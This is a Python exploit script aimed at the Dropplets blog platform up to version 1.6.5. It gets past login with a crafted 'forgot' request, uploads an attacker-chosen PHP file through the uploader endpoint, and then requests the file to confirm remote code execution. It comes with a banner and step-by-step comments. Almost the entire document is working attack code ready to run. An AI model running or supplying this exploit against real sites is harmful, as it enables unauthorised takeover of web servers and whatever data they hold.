#!/usr/bin/python
from __future__ import print_function
import requests
import sys
import argparse
import base64
import os
import random
import time

"""
How to exploit:

  1) Call /?action=forgot&verify=
  2) Call /includes/uploader.php = RCE ;)
"""


def randomname(extn='.php'):
    return base64.b32encode(os.urandom(20))[:random.randint(5, 10)] + extn


def parse_options():
    try:
        exploit_file = open('soggybiscuit.php', 'r')
    except Exception:
        exploit_file = None
    parser = argparse.ArgumentParser(description='Dropplets <= v1.6.5 Auth-Bypass + RCE Exploit')
    parser.add_argument('url', help='Base URL for Dropplets site')
    parser.add_argument('-s', '--search',
                        default='098f6bcd4621d373cade4e832627b4f6')
    parser.add_argument('-x', '--exploit', default=exploit_file,
                        type=argparse.FileType('r'))
    return parser.parse_args()


def pwn_droppler(options):
    sess = requests.Session()
    print("[-] Logging In")
    resp = sess.get(options.url + "/?action=forgot&verify=")
    resp.raise_for_status()
    print("[-] Uploading PHP code")
    filename = randomname()
    data = {'liteUploader_id': 'authorfiles'}
    files = {'authorfiles[]': (filename, options.exploit)}
    resp = sess.post(options.url + '/dropplets/includes/uploader.php', data=data, files=files)
    resp.raise_for_status()
    try:
        resp_json = resp.json()
        return False
    except ValueError:
        pass
    exploit_url = options.url + '/authors/' + filename
    print('[+] Exploit URL: ' + exploit_url)
    if '<span class="success"></span>' in resp.text:
        resp = sess.get(exploit_url)
        resp.raise_for_status()
        if options.search in resp.content:
            print('[$] Search string found, code is executable :D')
            return True
        print("[!] Search string not found... ;_;")


def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34]

    logo = """
______                       _      _____
|  _  \                     | |    |  __ \\
| | | |_ __ ___  _ __  _ __ | | ___| |  \/ __ _ _ __   __ _  ___ _ __
| | | | '__/ _ \| '_ \| '_ \| |/ _ \ | __ / _` | '_ \ / _` |/ _ \ '__|
| |/ /| | | (_) | |_) | |_) | |  __/ |_\ \ (_| | | | | (_| |  __/ |
|___/ |_|  \___/| .__/| .__/|_|\___|\____/\__,_|_| |_|\__, |\___|_|
                | |   | |                              __/ |
                |_|   |_|                             |___/

* Oh noes, it's raining... Dropplets blog <= v1.6.5 Auth-Bypass + RCE *
"""
    for N, line in enumerate(logo.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)


def main(base_url):
    print_logo()
    options = parse_options()
    if pwn_droppler(options):
        print("[$] SUCCESS:", options.url)
    else:
        print("[!] FAILURE")


if __name__ == "__main__":
    sys.exit(main("http://192.168.10.100:8080/joomla"))
